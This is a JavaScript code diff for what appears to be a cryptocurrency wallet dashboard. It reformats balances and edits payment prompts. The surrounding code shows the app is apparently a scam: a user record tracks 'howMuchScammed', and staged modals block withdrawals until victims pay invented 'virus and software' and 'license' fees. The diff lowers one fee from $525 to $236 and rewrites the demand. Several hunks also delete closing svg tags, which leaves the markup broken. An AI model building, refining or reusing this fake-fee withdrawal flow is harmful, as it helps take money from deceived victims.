@@ -269,11 +269,12 @@ async function loadUserData(user) {
     if (userDoc.exists) {
       console.log('User document found:', userDoc.data());
       userData = userDoc.data();
-      userBalance = userData.balance || '$0.00';
       
-      // Remove currency symbol for display and update balance
-      const balanceValue = userBalance.replace('$', '');
-      updateBalanceDisplay(balanceValue);
+      // Normalize stored balance to a numeric string (no $) for internal use
+      userBalance = String(userData.balance || '$0.00').replace(/\$/g, '').trim();
+      
+      // Update formatted display and BTC
+      updateBalanceDisplay(userBalance);
       
     } else {
       console.log('User document not found, creating default...');
@@ -294,8 +295,8 @@ async function loadUserData(user) {
       console.log('Created new user document');
       
       userData = newUserData;
-      userBalance = '$0.00';
-      updateBalanceDisplay('0.00');
+      userBalance = '0.00';
+      updateBalanceDisplay(userBalance);
     }
     
   } catch (error) {
@@ -308,8 +309,8 @@ async function loadUserData(user) {
       pendingPayment3: false,
       howMuchScammed: 0
     };
-    userBalance = '$0.00';
-    updateBalanceDisplay('0.00');
+    userBalance = '0.00';
+    updateBalanceDisplay(userBalance);
     
     // Show balance visibility by default
     balanceVisible = true;
@@ -319,12 +320,16 @@ async function loadUserData(user) {
 // Update balance display with USD and BTC conversion
 function updateBalanceDisplay(balanceValue) {
   if (balanceAmount) {
-    balanceAmount.textContent = balanceValue;
-    balanceAmount.setAttribute('data-balance', balanceValue);
+    // Ensure numeric value and format as USD with dollar sign
+    const numeric = parseFloat(String(balanceValue).replace(/[^0-9.-]+/g, '')) || 0;
+    const formatted = `$${numeric.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+    balanceAmount.textContent = balanceVisible ? formatted : '••••••';
+    // Keep numeric value in data-balance for reliable calculations
+    balanceAmount.setAttribute('data-balance', String(numeric));
   }
   
-  // Update BTC balance
-  updateBtcBalance(parseFloat(balanceValue) || 0);
+  // Update BTC balance using numeric value
+  updateBtcBalance(parseFloat(balanceAmount?.getAttribute('data-balance') || '0') || 0);
 }
 
 // Update BTC balance based on current USD balance and BTC price
@@ -507,17 +512,20 @@ if (withdrawBtn) {
 if (balanceToggle) {
   balanceToggle.addEventListener('click', () => {
     balanceVisible = !balanceVisible;
-    const balanceAmount = document.getElementById('balance-amount');
+    const balanceAmountEl = document.getElementById('balance-amount');
     const btcBalance = document.getElementById('btc-balance');
     const eyeIcon = balanceToggle.querySelector('i.icon-eye');
     
+    // Use the numeric data-balance for calculations
+    const numeric = parseFloat(balanceAmountEl?.getAttribute('data-balance') || '0') || 0;
+    
     if (balanceVisible) {
-      balanceAmount.textContent = userBalance;
-      btcBalance.textContent = (parseFloat(userBalance) / cryptoPriceData.bitcoin?.usd || 0).toFixed(8);
+      balanceAmountEl.textContent = `$${numeric.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+      btcBalance.textContent = (numeric / (cryptoPriceData.bitcoin?.usd || 1)).toFixed(8);
       eyeIcon.classList.remove('icon-eye-off');
       eyeIcon.classList.add('icon-eye');
     } else {
-      balanceAmount.textContent = '••••••';
+      balanceAmountEl.textContent = '••••••';
       btcBalance.textContent = '••••••••';
       eyeIcon.classList.remove('icon-eye');
       eyeIcon.classList.add('icon-eye-off');
@@ -578,8 +586,8 @@ function createPaymentModal(step, amount = null) {
   switch (step) {
     case 1:
       title = "Virus and Software Fee Required";
-      message = "Can't Withdraw at this point till the virus and software fee of $525 is cleared";
-      amountText = "$525";
+      message = "This is to notify you that before you can make the withdrawal the software and virus fee of $236 must be cleared by depositing to your wallet";
+      amountText = "$236";
       break;
     case 2:
       title = "License Fee Required";
@@ -867,7 +875,6 @@ async function handlePaymentComplete(step) {
           <span class="button-icon">
             <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
               <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-            </svg>
           </span>
           I have completed the payment
         `;
@@ -881,7 +888,6 @@ async function handlePaymentComplete(step) {
           <span class="button-icon">
             <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
               <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-            </svg>
           </span>
           I have completed the payment
         `;
@@ -919,7 +925,6 @@ async function handlePaymentComplete(step) {
       <span class="button-icon">
         <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
           <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-        </svg>
       </span>
       I have completed the payment
     `;
@@ -1139,7 +1144,6 @@ async function handleDepositComplete() {
       <span class="button-icon">
         <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
           <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
-        </svg>
       </span>
       I have sent the deposit
     `;
